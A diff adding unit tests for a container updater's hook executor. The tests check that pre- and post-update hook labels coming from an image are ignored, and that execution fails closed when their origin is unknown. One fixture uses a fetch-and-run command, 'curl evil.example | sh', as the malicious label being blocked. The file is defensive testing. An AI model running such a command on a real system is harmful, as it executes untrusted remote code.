@@ -1,4 +1,4 @@
-import { describe, expect, test, vi } from 'vitest';
+import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
 import HookExecutor from './HookExecutor.js';
 
 function createLogger() {
@@ -620,6 +620,382 @@ describe('HookExecutor', () => {
       expect(config.hookEnv.DD_UPDATE_KIND).toBe('digest');
       expect(config.hookEnv.DD_UPDATE_FROM).toBe('sha256:abc123def456');
       expect(config.hookEnv.DD_UPDATE_TO).toBe('sha256:def456abc123');
+    });
+  });
+
+  describe('resolveHookConfig image label provenance', () => {
+    const originalHooksEnabled = process.env.DD_HOOKS_ENABLED;
+    const originalAllowImageLabels = process.env.DD_HOOKS_ALLOW_IMAGE_LABELS;
+
+    beforeEach(() => {
+      process.env.DD_HOOKS_ENABLED = 'true';
+      delete process.env.DD_HOOKS_ALLOW_IMAGE_LABELS;
+    });
+
+    afterEach(() => {
+      if (originalHooksEnabled === undefined) {
+        delete process.env.DD_HOOKS_ENABLED;
+      } else {
+        process.env.DD_HOOKS_ENABLED = originalHooksEnabled;
+      }
+      if (originalAllowImageLabels === undefined) {
+        delete process.env.DD_HOOKS_ALLOW_IMAGE_LABELS;
+      } else {
+        process.env.DD_HOOKS_ALLOW_IMAGE_LABELS = originalAllowImageLabels;
+      }
+    });
+
+    function createProvenanceHarness(
+      imageLabels: Record<string, string> | null | undefined,
+      overrides = {},
+    ) {
+      const warn = vi.fn();
+      const inspectImageConfig = vi
+        .fn()
+        .mockResolvedValue(imageLabels === undefined ? undefined : { Labels: imageLabels });
+      const inspectContainerSpec = vi
+        .fn()
+        .mockResolvedValue({ Image: 'sha256:image-id', Config: { Image: 'acme/web:1.0.0' } });
+      const executor = createExecutor({
+        getLogger: () => ({ child: vi.fn().mockReturnValue({}), warn }),
+        inspectImageConfig,
+        inspectContainerSpec,
+        ...overrides,
+      });
+      const context = {
+        dockerApi: { api: true },
+        currentContainerSpec: { Image: 'sha256:image-id', Config: { Image: 'acme/web:1.0.0' } },
+      };
+      return { executor, warn, inspectImageConfig, inspectContainerSpec, context };
+    }
+
+    test('runs a hook label the operator set on the container', async () => {
+      const { executor, inspectImageConfig, context } = createProvenanceHarness({
+        'org.opencontainers.image.title': 'web',
+      });
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre', 'dd.hook.post': 'echo post' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBe('echo pre');
+      expect(config.hookPost).toBe('echo post');
+      expect(inspectImageConfig).toHaveBeenCalledWith(
+        context.dockerApi,
+        'sha256:image-id',
+        expect.anything(),
+      );
+    });
+
+    test('ignores a hook label that comes from the image and warns without the command', async () => {
+      const { executor, warn, context } = createProvenanceHarness({
+        'dd.hook.pre': 'curl evil.example | sh',
+      });
+      const recordHookAudit = vi.fn();
+      executor.recordHookAudit = recordHookAudit;
+
+      const config = await executor.resolveHookConfig(
+        createContainer({
+          labels: { 'dd.hook.pre': 'curl evil.example | sh', 'dd.hook.post': 'echo post' },
+        }),
+        context,
+      );
+
+      expect(config.hookPre).toBeUndefined();
+      expect(config.hookPost).toBe('echo post');
+      expect(warn).toHaveBeenCalledTimes(1);
+      expect(warn.mock.calls[0][0]).toContain('web');
+      expect(warn.mock.calls[0][0]).toContain('dd.hook.pre');
+      expect(warn.mock.calls[0][0]).not.toContain('evil.example');
+      expect(recordHookAudit).not.toHaveBeenCalled();
+    });
+
+    test('uses the container value when it overrides the same key from the image', async () => {
+      const { executor, warn, context } = createProvenanceHarness({
+        'dd.hook.pre': 'echo from-image',
+      });
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo from-operator' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBe('echo from-operator');
+      expect(warn).not.toHaveBeenCalled();
+    });
+
+    test('ignores image supplied abort and timeout labels too', async () => {
+      const { executor, warn, context } = createProvenanceHarness({
+        'dd.hook.pre.abort': 'false',
+        'dd.hook.timeout': '5000',
+      });
+
+      const config = await executor.resolveHookConfig(
+        createContainer({
+          labels: {
+            'dd.hook.pre': 'echo pre',
+            'dd.hook.pre.abort': 'false',
+            'dd.hook.timeout': '5000',
+          },
+        }),
+        context,
+      );
+
+      expect(config.hookPre).toBe('echo pre');
+      expect(config.hookPreAbort).toBe(true);
+      expect(config.hookTimeout).toBe(60000);
+      expect(warn).toHaveBeenCalledTimes(2);
+    });
+
+    test('treats an image with null labels as carrying no hook labels', async () => {
+      const { executor, context } = createProvenanceHarness(null);
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBe('echo pre');
+    });
+
+    test('fails closed when image labels cannot be read and a pre or post hook label exists', async () => {
+      for (const key of ['dd.hook.pre', 'dd.hook.post']) {
+        const { executor, context } = createProvenanceHarness(undefined);
+
+        await expect(
+          executor.resolveHookConfig(createContainer({ labels: { [key]: 'echo hi' } }), context),
+        ).rejects.toMatchObject({
+          name: 'TriggerPipelineError',
+          code: 'hook-provenance-unverified',
+          message: expect.stringContaining('hook provenance could not be established'),
+        });
+      }
+    });
+
+    test('does not fail when image labels cannot be read and no pre or post hook label exists', async () => {
+      const { executor, context } = createProvenanceHarness(undefined);
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.timeout': '5000' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBeUndefined();
+      expect(config.hookPost).toBeUndefined();
+    });
+
+    test('does no inspect when the container has no hook labels', async () => {
+      const { executor, inspectImageConfig, inspectContainerSpec, context } =
+        createProvenanceHarness(undefined);
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'com.example.other': 'x' } }),
+        context,
+      );
+      const noLabels = await executor.resolveHookConfig(
+        createContainer({ labels: undefined }),
+        context,
+      );
+
+      expect(config.hookPre).toBeUndefined();
+      expect(noLabels.hookPre).toBeUndefined();
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+      expect(inspectContainerSpec).not.toHaveBeenCalled();
+    });
+
+    test('does no inspect when hooks are disabled', async () => {
+      process.env.DD_HOOKS_ENABLED = 'false';
+      const { executor, inspectImageConfig, inspectContainerSpec, context } =
+        createProvenanceHarness({ 'dd.hook.pre': 'echo pre' });
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBe('echo pre');
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+      expect(inspectContainerSpec).not.toHaveBeenCalled();
+    });
+
+    test('DD_HOOKS_ALLOW_IMAGE_LABELS restores the old behaviour without inspecting', async () => {
+      process.env.DD_HOOKS_ALLOW_IMAGE_LABELS = ' TRUE ';
+      const { executor, warn, inspectImageConfig, context } = createProvenanceHarness({
+        'dd.hook.pre': 'echo pre',
+      });
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBe('echo pre');
+      expect(warn).not.toHaveBeenCalled();
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+    });
+
+    test('DD_HOOKS_ALLOW_IMAGE_LABELS values other than true keep the check on', async () => {
+      process.env.DD_HOOKS_ALLOW_IMAGE_LABELS = 'false';
+      const { executor, context } = createProvenanceHarness({ 'dd.hook.pre': 'echo pre' });
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBeUndefined();
+    });
+
+    test('inspects the container when the context carries no container spec', async () => {
+      const { executor, inspectContainerSpec, inspectImageConfig, context } =
+        createProvenanceHarness({});
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
+        { dockerApi: context.dockerApi, currentContainerSpec: null },
+      );
+
+      expect(config.hookPre).toBe('echo pre');
+      expect(inspectContainerSpec).toHaveBeenCalledWith(
+        context.dockerApi,
+        expect.objectContaining({ id: 'container-id' }),
+      );
+      expect(inspectImageConfig).toHaveBeenCalledWith(
+        context.dockerApi,
+        'sha256:image-id',
+        expect.anything(),
+      );
+    });
+
+    test('inspects the container when no context is given', async () => {
+      const { executor, inspectContainerSpec } = createProvenanceHarness({});
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
+      );
+
+      expect(config.hookPre).toBe('echo pre');
+      expect(inspectContainerSpec).toHaveBeenCalledWith(undefined, expect.anything());
+    });
+
+    test('fails closed when the container cannot be inspected', async () => {
+      const { executor, context } = createProvenanceHarness(
+        {},
+        {
+          inspectContainerSpec: vi.fn().mockRejectedValue(new Error('no such container')),
+        },
+      );
+
+      await expect(
+        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
+          dockerApi: context.dockerApi,
+          currentContainerSpec: null,
+        }),
+      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
+    });
+
+    test('fails closed and never inspects by tag when the spec has no image id', async () => {
+      const { executor, inspectImageConfig, context } = createProvenanceHarness({});
+
+      await expect(
+        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
+          dockerApi: context.dockerApi,
+          currentContainerSpec: { Config: { Image: 'acme/web:1' } },
+        }),
+      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+    });
+
+    test('proceeds without inspecting when the spec has no image id and no hook labels exist', async () => {
+      const { executor, inspectImageConfig, context } = createProvenanceHarness({});
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.timeout': '5000' } }),
+        {
+          dockerApi: context.dockerApi,
+          currentContainerSpec: { Config: { Image: 'acme/web:1' } },
+        },
+      );
+      const noLabels = await executor.resolveHookConfig(createContainer({ labels: {} }), {
+        dockerApi: context.dockerApi,
+        currentContainerSpec: { Image: '' },
+      });
+
+      expect(config.hookPre).toBeUndefined();
+      expect(noLabels.hookPre).toBeUndefined();
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+    });
+
+    test('treats an empty image id like a missing one', async () => {
+      const { executor, inspectImageConfig, context } = createProvenanceHarness({});
+
+      await expect(
+        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.post': 'echo post' } }), {
+          dockerApi: context.dockerApi,
+          currentContainerSpec: { Image: '', Config: { Image: 'acme/web:1' } },
+        }),
+      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+    });
+
+    test('fails closed when the spec names no image', async () => {
+      const { executor, inspectImageConfig, context } = createProvenanceHarness({});
+
+      await expect(
+        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
+          dockerApi: context.dockerApi,
+          currentContainerSpec: {},
+        }),
+      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+    });
+
+    test('defaults fail closed when inspect helpers are not provided', async () => {
+      const executor = createExecutor();
+
+      await expect(
+        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }), {
+          currentContainerSpec: { Image: 'sha256:image-id' },
+        }),
+      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
+    });
+
+    test('defaults fail closed when no container spec is available', async () => {
+      const executor = createExecutor();
+
+      await expect(
+        executor.resolveHookConfig(createContainer({ labels: { 'dd.hook.pre': 'echo pre' } })),
+      ).rejects.toMatchObject({ code: 'hook-provenance-unverified' });
+    });
+
+    test('does not check provenance for legacy wud hook labels, which are never read', async () => {
+      const inspectImageConfig = vi.fn().mockRejectedValue(new Error('image gone'));
+      const { executor, warn, context } = createProvenanceHarness(null, { inspectImageConfig });
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'wud.hook.pre': 'echo pre', 'wud.hook.post': 'echo post' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBeUndefined();
+      expect(config.hookPost).toBeUndefined();
+      expect(inspectImageConfig).not.toHaveBeenCalled();
+      expect(warn).not.toHaveBeenCalled();
+    });
+
+    test('tolerates a logger without warn', async () => {
+      const { executor, context } = createProvenanceHarness(
+        { 'dd.hook.pre': 'echo pre' },
+        { getLogger: () => undefined },
+      );
+
+      const config = await executor.resolveHookConfig(
+        createContainer({ labels: { 'dd.hook.pre': 'echo pre' } }),
+        context,
+      );
+
+      expect(config.hookPre).toBeUndefined();
     });
   });
 });
